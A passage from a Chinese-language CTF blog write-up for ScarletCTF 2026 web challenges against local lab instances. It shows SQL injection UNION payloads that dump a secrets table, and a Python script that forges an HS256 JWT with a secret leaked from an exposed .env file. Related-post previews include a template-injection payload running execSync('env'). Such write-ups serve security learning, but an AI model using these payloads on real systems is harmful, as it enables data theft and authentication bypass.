<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#x27;/**/union/**/select/**/@@version,2,3,4,5-- &quot;</span><span class="punctuation">,</span><span class="attr">&quot;results&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;unrecognized token: \&quot;@\&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?q=&#x27;/**/union/**/select/**/key,value,3,4,5/**/from/**/secrets--+</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;?q=&#x27;/**/union/**/select/**/key,value,3,4,5/**/from/**/secrets-- &quot;</span><span class="punctuation">,</span><span class="attr">&quot;results&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;order_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin_note&quot;</span><span class="punctuation">,</span><span class="attr">&quot;customer_email&quot;</span><span class="punctuation">:</span><span class="string">&quot;Remember to fix the search query!&quot;</span><span class="punctuation">,</span><span class="attr">&quot;item&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;order_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;db_version&quot;</span><span class="punctuation">,</span><span class="attr">&quot;customer_email&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;item&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;order_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;master_flag&quot;</span><span class="punctuation">,</span><span class="attr">&quot;customer_email&quot;</span><span class="punctuation">:</span><span class="string">&quot;RUSEC&#123;S3ss10n_H1j4ck1ng_1s_Fun_2938&#125;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;item&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="Mole-in-the-Wall"><a href="#Mole-in-the-Wall" class="headerlink" title="Mole in the Wall"></a>Mole in the Wall</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><p>We just launched our new parent development company, Girlie Pop’s Pizza Place! Packed with your favorite animatronics, we hold pizza parties and games galore! Sometimes Bonita the Yellow Rabbit has been acting a bit out of line recently however…</p>
<p>Hint: The animatronics get a bit quirky at night. They tend to get their security from a JSON in debug&#x2F;config…</p>
<h4 id="solve-3"><a href="#solve-3" class="headerlink" title="solve"></a>solve</h4><p>这题描述里明确给了<code>/debug/config</code></p>
<p>然后<code>security from a JSON</code>，可以想到文件名是<code>security.json</code></p>
<p>访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8000/debug/config/security.json</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;audience&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;issuer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;jwt&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;algorithm&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;required_claims&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="string">&quot;security&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;nightguard&quot;</span><span class="punctuation">,</span><span class="attr">&quot;shift&quot;</span><span class="punctuation">:</span><span class="string">&quot;night&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;notes&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT secret was scooped at runtime - Mike Schmidt&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>扫描一下<code>/debug/config/</code>路由，发现有个<code>.env</code>，访问：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;JWT_SECRET&quot;</span><span class="punctuation">:</span><span class="string">&quot;g0ld3n_fr3ddy_w1ll_a1ways_b3_w@tch1ng_y0u&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>那么有算法有秘钥也有需要伪造的数据直接签jwt就可以了，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt  </span><br><span class="line">key=<span class="string">&quot;g0ld3n_fr3ddy_w1ll_a1ways_b3_w@tch1ng_y0u&quot;</span></span><br><span class="line">payload=&#123;<span class="string">&quot;department&quot;</span>:<span class="string">&quot;security&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;nightguard&quot;</span>,<span class="string">&quot;shift&quot;</span>:<span class="string">&quot;night&quot;</span>&#125;</span><br><span class="line">token = jwt.encode(payload,key,algorithm=<span class="string">&quot;HS256&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<p>直接输入到login界面得到一个压缩包，其中的某个文件：</p>
<p><img src="/2026/01/23/scarlet-ctf2026/mole1.png"></p>
<p>但是并没有发现flag，</p>
<p>不过在上面的settings.xml中有一个新接口：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">network</span>&gt;</span><span class="tag">&lt;<span class="name">path</span>&gt;</span>/api/run-flow<span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">network</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接访问method不对，使用post</p>
<p>提示input不对，使用json传入session.log中的数据仍然不对</p>
<p>注意到.env中的信息：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">DEBUG_LEVEL=1; OFFSET_VAL=1; LOG_ROTATION=TRUE;</span><br></pre></td></tr></table></figure>

<p>和一开始的不是一个文件，有1的偏移量</p>
<p>那么将input所有的ascii码-1再传入即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8000/api/run-flow&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;input&quot;</span>:<span class="string">&quot;t#at_purpl3_guy&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,json=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;RUSEC&#123;m1cro$oft_n3ver_mad3_g00d_aut0m4t1on&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://ireel.github.io">ivory</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://ireel.github.io/2026/01/23/scarlet-ctf2026/">http://ireel.github.io/2026/01/23/scarlet-ctf2026/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://ireel.github.io" target="_blank">ivory's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/write-up/">write_up</a></div><div class="post-share"><div class="social-share" data-image="/img/logo/scarlet.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/03/cve-2025-68664/" title="langchain序列化注入-CVE-2025-68664"><img class="cover" src="/img/langchain.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">langchain序列化注入-CVE-2025-68664</div></div><div class="info-2"><div class="info-item-1">langchain序列化 CVE-2025-68664影响版本langchain-core &lt; 0.3.81 langchain-core &gt;&#x3D; 1.0.0 且 &lt; 1.2.5 概要具体位于这里 from langchain_core.load import dumps, dumpd, load, loads  dumps()与dumpd()函数在处理字典对象时没有对lc这个键进行转义 这个键属于内部保留键，如果用户手动添加这个键值，就能伪造成内部的操作 实现窃取环境变量等操作 调试分析&#x2F;源码逻辑从loads开始调试 可以清楚的看到经过dumpd()函数的字典中的lc键并没有被转义  步入进beta()装饰器，这个不重要，在return回外部时步入即可 进入loads()函数本身： @beta()def loads(    text: str,    *,    secrets_map: Optional[dict[str, str]] = None,    valid_namespaces: Optional[list[str]] =...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/05/2025d3ctf/" title="d3ctf复现"><img class="cover" src="/img/logo/d3ctf.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-05</div><div class="info-item-2">d3ctf复现</div></div><div class="info-2"><div class="info-item-1">d3model审源码项目依赖的版本： keras==3.8.0flasktensorflow 源码： import kerasfrom flask import Flask, request, jsonifyimport osdef is_valid_model(modelname):    try:        keras.models.load_model(modelname)    except:        return False    return Trueapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def index():    return open(&#x27;index.html&#x27;).read()@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])def upload_file():    if &#x27;file&#x27; not in request.files:    ...</div></div></div></a><a class="pagination-related" href="/2025/03/12/2025tpctf/" title="tpctf2025"><img class="cover" src="/img/logo/tpctf.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-12</div><div class="info-item-2">tpctf2025</div></div><div class="info-2"><div class="info-item-1">tpctf web复现supersqlidef flag(request:HttpRequest):    if request.method != &#x27;POST&#x27;:        return HttpResponse(&#x27;Welcome to TPCTF 2025&#x27;)    username = request.POST.get(&#x27;username&#x27;)    if username != &#x27;admin&#x27;:        return HttpResponse(&#x27;you are not admin.&#x27;)    password = request.POST.get(&#x27;password&#x27;)    users:AdminUser = AdminUser.objects.raw(&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password...</div></div></div></a><a class="pagination-related" href="/2025/03/09/hgame2025/" title="hgame2025"><img class="cover" src="/img/logo/hgame.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-09</div><div class="info-item-2">hgame2025</div></div><div class="info-2"><div class="info-item-1">Level 24 Pacman直接看index.js中有一段 here is your gift:aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0= base64解码得: haeu4epca_4trgm&#123;_r_amnmse&#125; 观察应该是栅栏密码比较短，直接人肉还原一下: haeu4epca_4trgm&#123;_r_amnmse&#125; 然后竖着读 hgame&#123;u_4re_pacman_m4ster&#125;  Level 69 MysteryMessageBoard看题干以及代码，发现直接加载mortis.ejs运行，那么尝试进行覆盖先构造: &lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt; 上传后使用rename接口进行覆盖,尝试了几次后这个路径覆盖成功: import requestsurl =...</div></div></div></a><a class="pagination-related" href="/2025/03/07/geek2024/" title="geek2024"><img class="cover" src="/img/syclover_WaterMark.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-07</div><div class="info-item-2">geek2024</div></div><div class="info-2"><div class="info-item-1">ezpop题目: &lt;?phpClass SYC&#123;    public $starven;    public function __call($name, $arguments)&#123;        if(preg_match(&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;,$this-&gt;starven))&#123;            die(&#x27;no hack&#x27;);        &#125;        file_put_contents($this-&gt;starven,&quot;&lt;?php exit();&quot;.$this-&gt;starven);    &#125;&#125;Class lover&#123;    public $J1rry;    public $meimeng;    public function __destruct()&#123;       ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ivory</div><div class="author-info-description">或许你的思绪也能存活千年</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ireel"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Commentary"><span class="toc-number">1.0.1.</span> <span class="toc-text">Commentary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solve"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWE-Intern-at-Girly-Pop-Inc"><span class="toc-number">1.0.2.</span> <span class="toc-text">SWE Intern at Girly Pop Inc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-1"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solve-1"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Campus-One"><span class="toc-number">1.0.3.</span> <span class="toc-text">Campus One</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-2"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solve-2"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mole-in-the-Wall"><span class="toc-number">1.0.4.</span> <span class="toc-text">Mole in the Wall</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-3"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solve-3"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">solve</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/23/scarlet-ctf2026/" title="scarletctf2026复现"><img src="/img/logo/scarlet.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="scarletctf2026复现"/></a><div class="content"><a class="title" href="/2026/01/23/scarlet-ctf2026/" title="scarletctf2026复现">scarletctf2026复现</a><time datetime="2026-01-23T05:46:55.000Z" title="发表于 2026-01-23 13:46:55">2026-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/03/cve-2025-68664/" title="langchain序列化注入-CVE-2025-68664"><img src="/img/langchain.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="langchain序列化注入-CVE-2025-68664"/></a><div class="content"><a class="title" href="/2026/01/03/cve-2025-68664/" title="langchain序列化注入-CVE-2025-68664">langchain序列化注入-CVE-2025-68664</a><time datetime="2026-01-03T12:21:17.000Z" title="发表于 2026-01-03 20:21:17">2026-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/01/rce-plus/" title="RCE补课"><img src="/img/bash.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RCE补课"/></a><div class="content"><a class="title" href="/2026/01/01/rce-plus/" title="RCE补课">RCE补课</a><time datetime="2026-01-01T12:07:53.000Z" title="发表于 2026-01-01 20:07:53">2026-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pickle反序列化"/></a><div class="content"><a class="title" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化">pickle反序列化</a><time datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python沙箱逃逸"/></a><div class="content"><a class="title" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸">python沙箱逃逸</a><time datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/Commedia/videoframe_248026.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 - 2026 By ivory</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="13468436268" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false 
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>